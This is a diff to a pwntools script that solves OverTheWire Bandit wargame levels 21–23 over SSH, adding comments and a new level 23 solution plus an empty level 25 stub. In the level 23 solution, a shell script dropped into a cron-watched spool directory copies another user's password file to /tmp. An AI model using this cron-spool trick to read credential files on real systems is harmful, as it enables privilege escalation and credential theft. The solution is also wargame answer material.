@@ -149,6 +149,7 @@ def level_21(conn: pwn.ssh):
     cat_output = run(conn, f"cat /etc/cron.d/{cronjob_bandit22}")
     sh_file = cat_output.splitlines()[-1].split(" ")[-3]
 
+    # /usr/bin/cronjob_bandit22.sh
     cat_output = run(conn, f"cat {sh_file}")
     tmp_file = cat_output.splitlines()[-1].split(" ")[-1]
 
@@ -162,6 +163,7 @@ def level_22(conn: pwn.ssh):
     cat_output = run(conn, f"cat /etc/cron.d/{cronjob_bandit23}")
     sh_file = cat_output.splitlines()[-1].split(" ")[-4]
 
+    # /usr/bin/cronjob_bandit23.sh
     cat_output = run(conn, f"cat {sh_file}")
 
     # mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
@@ -170,4 +172,18 @@ def level_22(conn: pwn.ssh):
 
 
 def level_23(conn: pwn.ssh):
-    run(conn, "cat /etc/bandit_pass/bandit23")
+    run(conn, f"cat /usr/bin/cronjob_bandit24.sh")
+
+    run(
+        conn,
+        """\
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt' > /var/spool/bandit24/foo/bandit24_pass.sh
+chmod +x /var/spool/bandit24/foo/bandit24_pass.sh
+sleep 60s
+cat /tmp/bandit24_pass.txt
+""",
+    )
+
+
+def level_25(conn: pwn.ssh):
+    run(conn, "")
